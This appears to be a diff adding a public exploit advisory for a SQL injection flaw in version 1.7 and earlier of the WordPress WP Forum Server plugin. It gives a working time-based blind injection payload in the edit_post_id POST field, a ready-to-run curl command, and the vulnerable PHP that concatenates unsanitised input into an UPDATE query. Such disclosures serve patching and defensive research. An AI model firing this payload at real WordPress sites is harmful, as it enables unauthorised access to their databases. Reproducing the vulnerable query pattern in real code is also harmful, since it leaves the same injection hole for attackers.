@@ -1,0 +1,26 @@
+# Exploit Title: WordPress WP Forum Server plugin <= 1.7 SQL Injection Vulnerability
+# Date: 2011-09-07
+# Author: Miroslav Stampar (miroslav.stampar(at)gmail.com @stamparm)
+# Software Link: http://downloads.wordpress.org/plugin/forum-server.zip
+# Version: 1.7 (tested)
+
+---------------
+PoC (POST data)
+---------------
+http://www.site.com/wp-content/plugins/forum-server/wpf-insert.php
+ edit_post_submit=1&edit_post_id=-1 AND 1=IF(2>1,BENCHMARK(5000000,MD5(CHAR(115,113,108,109,97,112))),0)--%20&edit_post_subject=test&message=dummy&thread_id=1
+
+e.g.
+curl --data "edit_post_submit=1&edit_post_id=-1 AND 1=IF(2>1,BENCHMARK(5000000,MD5(CHAR(115,113,108,109,97,112))),0)--%20&edit_post_subject=test&message=dummy&thread_id=1" http://www.site.com/wp-content/plugins/forum-server/wpf-insert.php
+
+---------------
+Vulnerable code
+---------------
+if(isset($_POST['edit_post_submit'])){
+    $subject = $vasthtml->input_filter($_POST['edit_post_subject']);
+    $content = $vasthtml->input_filter($_POST['message']);
+    $thread = $vasthtml->check_parms($_POST['thread_id']);
+    $edit_post_id = $_POST['edit_post_id'];
+    ...    
+    $sql = ("UPDATE $vasthtml->t_posts SET text = '".stripslashes($content)."', subject = '".stripslashes($subject)."' WHERE id = $edit_post_id");
+    $wpdb->query($sql);
